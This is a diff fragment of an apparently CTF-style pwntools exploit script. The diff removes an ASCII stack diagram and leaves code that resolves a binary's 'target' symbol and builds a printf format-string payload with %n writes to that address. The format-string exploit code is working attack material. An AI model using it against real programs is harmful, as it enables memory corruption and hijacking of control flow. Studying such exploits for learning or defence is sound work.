@@ -9,37 +9,6 @@ e = ELF(lbin)
 target_addr = e.symbols['target']
 log.info('target_addr: %08x', target_addr)
 
-'''
-      .
-      .
-      +================ (printf)
-      | printfbuffer+X
-      +---------------- <-- sp_printbuffer     ($0)
-      | buf ptr         o-------------------.
- 0x18 |----------------                     |   $1
-      |     ...                             |   ..
-      +---------------- <-- bp_printbuffer  |   $6
-  4   | bp_vuln                             |
-      +================ (printbuffer)       |   $7
-  4   | vuln+X                              |
-      +---------------- <-- sp_vuln         |   $8
-  4   | buf ptr         o--.                |
-      |----------------    |                |   $9
-  4   | size (512)         |                |
-      |----------------    |                |  $10
-  4   | stream (stdin)     |                |
-      |----------------    |                |  $11
-  4   |     ...            |                |
-      +---------------- <--'----------------'  $12
-0x208 | buf
-      +---------------- <-- bp_vuln
-      | bp_main
-      +================ (vuln)
-  ?   |     ...
-      `---------------- 0xbfffffff (stack)
-
-'''
-
 idx = 12  # payload index for printf
 nidx = lambda i: '%' + str(idx + i) + '$n'  # helper to focus on the addresses at the beginning of the payload
 payload = p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2)  # first digit is far away (0x44), so we can fit the write addresses first
